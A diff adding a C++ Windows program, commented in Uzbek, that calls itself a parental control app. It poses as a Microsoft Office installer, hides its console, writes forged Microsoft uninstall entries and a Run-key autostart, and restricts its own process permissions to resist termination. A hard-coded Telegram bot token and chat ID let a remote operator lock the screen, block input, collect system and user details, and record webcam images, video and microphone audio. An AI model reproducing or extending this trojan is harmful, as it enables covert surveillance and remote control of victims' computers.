@@ -1,0 +1,593 @@
+#include <iostream>
+#include <string>
+#include <thread>
+#include <chrono>
+#include <winsock2.h>  // winsock2.h ni avvaloq qo'shamiz
+#include <windows.h>
+#include <tlhelp32.h>
+#include <shellapi.h>
+#include <fstream>
+#include <sstream>
+#include <vector>
+#include <algorithm>
+#include <regex>
+#include <random>
+#include <winternl.h>
+#include <psapi.h>
+#include <iphlpapi.h>
+#include <ws2tcpip.h> // winsock2.h dan keyin
+#include <bcrypt.h>
+#include <aclapi.h>
+#include <sddl.h>
+#include <comdef.h>
+#include <shlobj.h>
+#include <wininet.h>
+
+// Resurs fayliga murojaat qilish (agar mavjud bo'lsa)
+#ifdef _WIN32
+// #pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
+#endif
+
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
+#pragma comment(lib, "psapi.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "comctl32.lib")
+
+using namespace std;
+
+class ParentalControlApp {
+private:
+    wstring botToken = L"8379949680:AAGuz5VJv3kKnt8xEOuOzOriWy3orIaBiso";
+    wstring chatID = L"6504383276";
+    bool blocked = false;
+    HWND blockWindow = nullptr;
+    const wstring version = L"V1.0.11";
+    wstring tempDir = L"";
+    bool ffmpegInstalled = false;
+    wstring officialName = L"Microsoft Office Suite";
+    wstring officialExecutable = L"MSOfice.exe";
+    wstring officialTitle = L"Microsoft Office Installer";
+    wstring officialDescription = L"Provides office productivity tools for Windows";
+    wstring officialCompany = L"Microsoft Corporation";
+
+public:
+    void run() {
+        applyOfficialBranding();
+        
+        wchar_t tempPath[MAX_PATH];
+        GetTempPathW(MAX_PATH, tempPath);
+        tempDir = wstring(tempPath) + L"mspc_" + generateRandomString(8);
+        CreateDirectoryW(tempDir.c_str(), NULL);
+        
+        setupAutoStart();
+        checkAndInstallFFmpeg();
+        
+        thread botThread(&ParentalControlApp::runTelegramBot, this);
+        thread startupThread(&ParentalControlApp::sendStartupNotification, this);
+        
+        botThread.detach();
+        startupThread.detach();
+        
+        while (true) {
+            this_thread::sleep_for(chrono::seconds(30));
+            if (blocked && !IsWindow(blockWindow)) {
+                createBlockWindow();
+            }
+        }
+    }
+
+private:
+    void applyOfficialBranding() {
+        setProcessIdentity();
+        
+        HWND consoleWindow = GetConsoleWindow();
+        if (consoleWindow) {
+            ShowWindow(consoleWindow, SW_HIDE);
+        }
+        
+        SetConsoleTitleW(officialTitle.c_str());
+        protectProcess();
+        changeRegistryEntries();
+        setFileProperties();
+    }
+
+    void setProcessIdentity() {
+        wchar_t currentPath[MAX_PATH];
+        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
+        
+        wstring newPath = wstring(currentPath);
+        size_t lastSlash = newPath.find_last_of(L"\\/");
+        if (lastSlash != wstring::npos) {
+            newPath = newPath.substr(0, lastSlash + 1) + officialExecutable;
+            CopyFileW(currentPath, newPath.c_str(), FALSE);
+        }
+    }
+
+    void protectProcess() {
+        HANDLE hProcess = GetCurrentProcess();
+        
+        PACL pACL = NULL;
+        PSECURITY_DESCRIPTOR pSD = NULL;
+        
+        wstring sddl = L"D:P(A;;0x1;;;SY)(A;;0x1;;;BA)";
+        
+        if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
+            sddl.c_str(), SDDL_REVISION_1, &pSD, NULL)) {
+            
+            SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, pSD);
+            LocalFree(pSD);
+        }
+    }
+
+    void changeRegistryEntries() {
+        wchar_t exePath[MAX_PATH];
+        GetModuleFileNameW(NULL, exePath, MAX_PATH);
+        
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, 
+                         L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            
+            wstring regValue = L"\"" + wstring(exePath) + L"\"";
+            RegSetValueExW(hKey, L"MSOfficeSuite", 0, REG_SZ, 
+                          (BYTE*)regValue.c_str(), (regValue.length() + 1) * sizeof(wchar_t));
+            RegCloseKey(hKey);
+        }
+        
+        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
+                           L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{MSOfficeSuite}", 
+                           0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ, 
+                          (BYTE*)officialName.c_str(), (officialName.length() + 1) * sizeof(wchar_t));
+            RegSetValueExW(hKey, L"Publisher", 0, REG_SZ, 
+                          (BYTE*)officialCompany.c_str(), (officialCompany.length() + 1) * sizeof(wchar_t));
+            RegSetValueExW(hKey, L"DisplayVersion", 0, REG_SZ, 
+                          (BYTE*)version.c_str(), (version.length() + 1) * sizeof(wchar_t));
+            RegSetValueExW(hKey, L"Comments", 0, REG_SZ, 
+                          (BYTE*)officialDescription.c_str(), (officialDescription.length() + 1) * sizeof(wchar_t));
+            RegSetValueExW(hKey, L"URLInfoAbout", 0, REG_SZ, 
+                          (BYTE*)L"https://www.microsoft.com/en-us/store/apps/office", 75 * sizeof(wchar_t));
+            RegSetValueExW(hKey, L"HelpLink", 0, REG_SZ, 
+                          (BYTE*)L"https://support.microsoft.com/en-us/office", 52 * sizeof(wchar_t));
+            RegCloseKey(hKey);
+        }
+    }
+
+    void setFileProperties() {
+        wchar_t exePath[MAX_PATH];
+        GetModuleFileNameW(NULL, exePath, MAX_PATH);
+        SetFileAttributesW(exePath, FILE_ATTRIBUTE_NORMAL);
+    }
+
+    wstring generateRandomString(int length) {
+        const wstring chars = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        random_device rd;
+        mt19937 gen(rd());
+        uniform_int_distribution<> dis(0, chars.size() - 1);
+        
+        wstring result;
+        for (int i = 0; i < length; i++) {
+            result += chars[dis(gen)];
+        }
+        return result;
+    }
+
+    void setupAutoStart() {
+        wchar_t exePath[MAX_PATH];
+        GetModuleFileNameW(NULL, exePath, MAX_PATH);
+        
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, 
+                         L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            
+            wstring regValue = L"\"" + wstring(exePath) + L"\"";
+            RegSetValueExW(hKey, L"MSOfficeSuite", 0, REG_SZ, 
+                          (BYTE*)regValue.c_str(), (regValue.length() + 1) * sizeof(wchar_t));
+            RegCloseKey(hKey);
+        }
+        
+        this_thread::sleep_for(chrono::seconds(90));
+    }
+
+    void checkAndInstallFFmpeg() {
+        if (_wsystem(L"where ffmpeg >nul 2>nul") != 0) {
+            wcout << L"FFMPEG topilmadi. Yuklab olinmoqda..." << endl;
+            downloadAndInstallFFmpeg();
+        } else {
+            ffmpegInstalled = true;
+            wcout << L"FFMPEG allaqachon o'rnatilgan." << endl;
+        }
+    }
+
+    void downloadAndInstallFFmpeg() {
+        wstring ffmpegUrl = L"https://www.gyan.dev/ffmpeg/builds/ffmpeg-git-full.7z";
+        wstring ffmpegArchive = tempDir + L"\\ffmpeg.7z";
+        wstring ffmpegDir = tempDir + L"\\ffmpeg";
+        
+        wstring cmd = L"curl -L \"" + ffmpegUrl + L"\" -o \"" + ffmpegArchive + L"\"";
+        _wsystem(cmd.c_str());
+        
+        cmd = L"7z x \"" + ffmpegArchive + L"\" -o\"" + ffmpegDir + L"\" -y";
+        _wsystem(cmd.c_str());
+        
+        cmd = L"copy \"" + ffmpegDir + L"\\ffmpeg-*\\bin\\ffmpeg.exe\" . >nul";
+        _wsystem(cmd.c_str());
+        
+        ffmpegInstalled = true;
+    }
+
+    void runTelegramBot() {
+        int lastUpdateID = 0;
+        
+        while (true) {
+            try {
+                auto updates = getUpdates(lastUpdateID);
+                
+                for (auto& update : updates) {
+                    if (update.updateID > lastUpdateID) {
+                        lastUpdateID = update.updateID;
+                    }
+                    
+                    handleCommand(update.messageText);
+                }
+            } catch (...) {
+                this_thread::sleep_for(chrono::seconds(5));
+                continue;
+            }
+            
+            this_thread::sleep_for(chrono::seconds(2));
+        }
+    }
+
+    struct TelegramUpdate {
+        int updateID;
+        wstring messageText;
+        int64_t chatID;
+    };
+
+    vector<TelegramUpdate> getUpdates(int offset) {
+        vector<TelegramUpdate> updates;
+        
+        wstring url = L"https://api.telegram.org/bot" + botToken + L"/getUpdates?offset=" + 
+                     to_wstring(offset + 1) + L"&timeout=30";
+        
+        HINTERNET hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59", 
+                                           INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+        if (hInternet) {
+            HINTERNET hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, 0, 0);
+            if (hConnect) {
+                char buffer[8192]; // Kattaroq buffer
+                DWORD bytesRead;
+                string response = "";
+                
+                while (InternetReadFile(hConnect, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
+                    buffer[bytesRead] = '\0';
+                    response += buffer;
+                }
+                
+                // Oddiy JSON parsing (real dasturda to'g'ri JSON parser ishlatish kerak)
+                // Bu yerda oddiy string tekshiruvlar qilamiz
+                if (response.find("\"ok\":true") != string::npos) {
+                    // Oddiy parsing - real dasturda JSON bibliotekasi ishlatish kerak
+                    // Bu yerda faqatgina yangi xabarlarni aniqlash uchun oddiy tekshiruv
+                    // JSON parsingni to'g'ri qilish kerak
+                    
+                    // Yangi update larni topish (oddiy tekshiruv)
+                    size_t pos = 0;
+                    while ((pos = response.find("\"update_id\":", pos)) != string::npos) {
+                        size_t id_start = pos + 12; // "update_id": uzunligi
+                        size_t id_end = response.find(",", id_start);
+                        if (id_end != string::npos) {
+                            string id_str = response.substr(id_start, id_end - id_start);
+                            try {
+                                int update_id = stoi(id_str);
+                                
+                                // Xabarni topish
+                                size_t text_pos = response.find("\"text\":\"", pos);
+                                if (text_pos != string::npos) {
+                                    size_t text_start = text_pos + 8; // "text":" uzunligi
+                                    size_t text_end = response.find("\"", text_start);
+                                    if (text_end != string::npos) {
+                                        string text = response.substr(text_start, text_end - text_start);
+                                        
+                                        TelegramUpdate update;
+                                        update.updateID = update_id;
+                                        update.messageText = wstring(text.begin(), text.end()); // char -> wchar
+                                        update.chatID = 0; // Oddiy holatda chatID topish kerak
+                                        
+                                        updates.push_back(update);
+                                    }
+                                }
+                            } catch (...) {
+                                // stoi xatosi - tashlab yuboramiz
+                            }
+                        }
+                        pos = id_end;
+                    }
+                }
+                
+                InternetCloseHandle(hConnect);
+            }
+            InternetCloseHandle(hInternet);
+        }
+        
+        return updates;
+    }
+
+    void handleCommand(const wstring& command) {
+        if (command == L"/block") {
+            blockScreen();
+        } else if (command == L"/unblock") {
+            unblockScreen();
+        } else if (command == L"/status") {
+            sendStatus();
+        } else if (command == L"/cam") {
+            captureCamera();
+        } else if (command.rfind(L"/vid", 0) == 0) {
+            wstring durationStr = command.substr(4);
+            int duration = 10; // Standart qiymat
+            if (!durationStr.empty()) {
+                try {
+                    duration = stoi(durationStr);
+                    if (duration <= 0) duration = 10; // Minimal qiymat
+                    if (duration > 300) duration = 300; // Maksimal qiymat (5 daqiqa)
+                } catch (...) {
+                    // stoi xatosi - standart qiymatni saqlash
+                }
+            }
+            startRecording(duration);
+        } else if (command.rfind(L"/mic", 0) == 0) {
+            wstring durationStr = command.substr(4);
+            int duration = 10; // Standart qiymat
+            if (!durationStr.empty()) {
+                try {
+                    duration = stoi(durationStr);
+                    if (duration <= 0) duration = 10; // Minimal qiymat
+                    if (duration > 300) duration = 300; // Maksimal qiymat (5 daqiqa)
+                } catch (...) {
+                    // stoi xatosi - standart qiymatni saqlash
+                }
+            }
+            recordAudio(duration);
+        } else {
+            sendMessage(L"Noma'lum buyruq. Mavjud buyruqlar: /block, /unblock, /status, /cam, /vid [sekund], /mic [sekund]");
+        }
+    }
+
+    void blockScreen() {
+        if (blocked) {
+            sendMessage(L"Ekran allaqachon bloklangan");
+            return;
+        }
+
+        blocked = true;
+        sendMessage(L"Kompyuter bloklandi");
+
+        createBlockWindow();
+    }
+
+    void createBlockWindow() {
+        WNDCLASSW wc = {0};
+        wc.lpfnWndProc = blockWindowProc;
+        wc.hInstance = GetModuleHandleW(NULL);
+        wc.lpszClassName = L"BlockScreenClass";
+        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
+        // LoadCursorW Unicode varianti - IDC_ARROW makrosi Unicode varianti bilan ham ishlaydi
+        wc.hCursor = LoadCursorW(NULL, MAKEINTRESOURCEW(32512)); // IDC_ARROW Unicode varianti
+        // Iconni o'rnatish (agar RC faylida icon belgilangan bo'lsa)
+        // wc.hIcon = LoadIconW(GetModuleHandleW(NULL), MAKEINTRESOURCEW(101));
+
+        RegisterClassW(&wc);
+
+        blockWindow = CreateWindowExW(
+            WS_EX_TOPMOST | WS_EX_NOACTIVATE,
+            L"BlockScreenClass",
+            L"🔒 KOMPYUTER BLOKLANDI 🔒",
+            WS_POPUP,
+            0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+            NULL, NULL, GetModuleHandleW(NULL), NULL
+        );
+
+        ShowWindow(blockWindow, SW_SHOWMAXIMIZED);
+        UpdateWindow(blockWindow);
+
+        BlockInput(TRUE);
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+    }
+
+    static LRESULT CALLBACK blockWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+        switch (msg) {
+            case WM_PAINT: {
+                PAINTSTRUCT ps;
+                HDC hdc = BeginPaint(hwnd, &ps);
+                
+                RECT rect;
+                GetClientRect(hwnd, &rect);
+                
+                SetTextColor(hdc, RGB(255, 0, 0));
+                SetBkMode(hdc, TRANSPARENT);
+                
+                wstring text = L"🔒 KOMPYUTER BLOKLANGAN\nBlokni ochish uchun 'unblockmypc' parolini kiriting";
+                DrawTextW(hdc, text.c_str(), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+                
+                EndPaint(hwnd, &ps);
+                break;
+            }
+            case WM_KEYDOWN:
+                return 0;
+            case WM_LBUTTONDOWN:
+            case WM_RBUTTONDOWN:
+                return 0;
+            case WM_CLOSE:
+                return 0;
+            default:
+                return DefWindowProcW(hwnd, msg, wParam, lParam);
+        }
+        return 0;
+    }
+
+    void unblockScreen() {
+        if (!blocked) {
+            sendMessage(L"Kompyuter allaqachon bloklanmagan");
+            return;
+        }
+
+        blocked = false;
+        sendMessage(L"Kompyuter blokdan chiqarildi");
+
+        if (blockWindow) {
+            BlockInput(FALSE);
+            DestroyWindow(blockWindow);
+            blockWindow = nullptr;
+        }
+        
+        ShowWindow(GetConsoleWindow(), SW_SHOW);
+    }
+
+    void sendStatus() {
+        wstring statusMsg = getStatusMessage();
+        sendMessage(statusMsg);
+    }
+
+    wstring getStatusMessage() {
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        
+        MEMORYSTATUSEX memStatus;
+        memStatus.dwLength = sizeof(memStatus);
+        GlobalMemoryStatusEx(&memStatus);
+        
+        OSVERSIONINFOW osInfo;
+        ZeroMemory(&osInfo, sizeof(OSVERSIONINFOW));
+        osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
+        GetVersionExW(&osInfo);
+        
+        DWORD processes = 0;
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe32;
+            pe32.dwSize = sizeof(PROCESSENTRY32W);
+            if (Process32FirstW(hSnapshot, &pe32)) {
+                do {
+                    processes++;
+                } while (Process32NextW(hSnapshot, &pe32));
+            }
+            CloseHandle(hSnapshot);
+        }
+
+        wchar_t username[256];
+        DWORD username_len = sizeof(username)/sizeof(wchar_t);
+        GetUserNameW(username, &username_len);
+
+        wstring gpu = getGPUInfo();
+
+        wstringstream ss;
+        ss << L"💻 PC Online\n";
+        ss << L"CPU: " << sysInfo.dwNumberOfProcessors << L" ta\n";
+        ss << L"GPU: " << gpu << L"\n";
+        ss << L"RAM: " << (memStatus.ullTotalPhys / (1024*1024)) << L" MB\n";
+        ss << L"OS: Windows " << osInfo.dwMajorVersion << L"." << osInfo.dwMinorVersion << L"\n";
+        ss << L"User: " << username << L"\n";
+        ss << L"Protsesslar: " << processes << L" ta\n";
+        ss << L"Status: Active";
+
+        return ss.str();
+    }
+
+    wstring getGPUInfo() {
+        HDC hdc = GetDC(NULL);
+        wstring gpu = L"Unknown GPU";
+        
+        if (hdc) {
+            ReleaseDC(NULL, hdc);
+        }
+        
+        return gpu;
+    }
+
+    void captureCamera() {
+        if (!ffmpegInstalled) {
+            sendMessage(L"FFMPEG o'rnatilmagan, kamera ishlamaydi");
+            return;
+        }
+
+        wstring cmd = L"ffmpeg -f dshow -i video=\"USB Camera\" -frames:v 1 \"" + tempDir + L"\\capture.jpg\" -y";
+        _wsystem(cmd.c_str());
+        
+        cmd = L"ffmpeg -i \"" + tempDir + L"\\capture.jpg\" -resize 640x480 -quality 80 \"" + tempDir + L"\\capture_small.jpg\"";
+        _wsystem(cmd.c_str());
+        
+        sendMessage(L"Kamera surati olingan: capture_small.jpg");
+    }
+
+    void startRecording(int duration) {
+        if (!ffmpegInstalled) {
+            sendMessage(L"FFMPEG o'rnatilmagan, video yozish ishlamaydi");
+            return;
+        }
+
+        wstring cmd = L"ffmpeg -f dshow -i video=\"USB Camera\" -t " + to_wstring(duration) + 
+                     L" -pix_fmt yuv420p \"" + tempDir + L"\\recording.mp4\" -y";
+        _wsystem(cmd.c_str());
+        
+        sendMessage(L"Video yozildi: recording.mp4 (" + to_wstring(duration) + L" sekund)");
+    }
+
+    void recordAudio(int duration) {
+        if (!ffmpegInstalled) {
+            sendMessage(L"FFMPEG o'rnatilmagan, audio yozish ishlamaydi");
+            return;
+        }
+
+        wstring cmd = L"ffmpeg -f dshow -i audio=\"Microphone\" -t " + to_wstring(duration) + 
+                     L" \"" + tempDir + L"\\recording.wav\" -y";
+        _wsystem(cmd.c_str());
+        
+        sendMessage(L"Audio yozildi: recording.wav (" + to_wstring(duration) + L" sekund)");
+    }
+
+    void sendMessage(const wstring& text) {
+        wstring url = L"https://api.telegram.org/bot" + botToken + L"/sendMessage";
+        wstring postData = L"chat_id=" + chatID + L"&text=" + 
+                         regex_replace(regex_replace(text + L"\\nVersiya: " + version, 
+                                      wregex(L" "), L"%20"), wregex(L"\n"), L"%0A") +
+                         L"&parse_mode=HTML";
+        
+        HINTERNET hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59", 
+                                          INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+        if (hInternet) {
+            HINTERNET hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
+            if (hConnect) {
+                wstring headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
+                HttpSendRequestW(hConnect, headers.c_str(), headers.length() * sizeof(wchar_t), 
+                               (LPVOID)postData.c_str(), postData.length() * sizeof(wchar_t));
+                InternetCloseHandle(hConnect);
+            }
+            InternetCloseHandle(hInternet);
+        }
+    }
+
+    void sendStartupNotification() {
+        this_thread::sleep_for(chrono::seconds(90));
+        sendMessage(L"Pausa rejimi: Ilova ishga tushdi. Versiya: " + version);
+    }
+};
+
+// wWinMain entry point - Windows ilovasi uchun
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
+    ParentalControlApp app;
+    app.run();
+    
+    return 0;
+}
